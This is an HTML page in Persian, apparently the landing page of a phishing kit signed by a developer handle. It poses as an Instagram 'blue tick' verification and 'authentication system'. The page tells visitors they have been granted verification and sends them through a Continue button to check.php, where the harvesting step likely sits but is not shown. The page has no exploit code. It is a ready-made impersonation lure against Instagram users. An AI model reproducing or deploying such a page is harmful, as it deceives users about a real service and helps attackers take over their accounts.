<!-- #->Dev => @ZProGrammer - @ZProGramming -->
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <meta name="description" content="">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>دریافت تیک آبی</title>
  <link href="https://cdn.rawgit.com/rastikerdar/shabnam-font/v4.0.0/dist/font-face.css" rel="stylesheet" type="text/css" /><link rel="stylesheet" href="assets/css/style.css">

</head>
<body>

<div class="card">
  <div class="field">
  
    <span class="header">سامانه احراز هویت </span><br>
  <div id="verfy"><img src="assets/img/verify.png" alt="" width="100" height="100" /></div>
  <!-- #->Dev => @ZProGrammer - @ZProGramming -->
  
  شما با تیک آبی به رسمیت شناخته شده و نباید از این امر سواستفاده کنید
     <form action="check.php" method="post">
      <button type="submit" value="Submit" class="button"><span>ادامه</span></button>
   
    </div>
 </form>
  
    <br><br>
 
     Instagram  FA
  </div>

  </div>
</div>

  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>

</body>
</html>
<!-- #->Dev => @ZProGrammer - @ZProGramming -->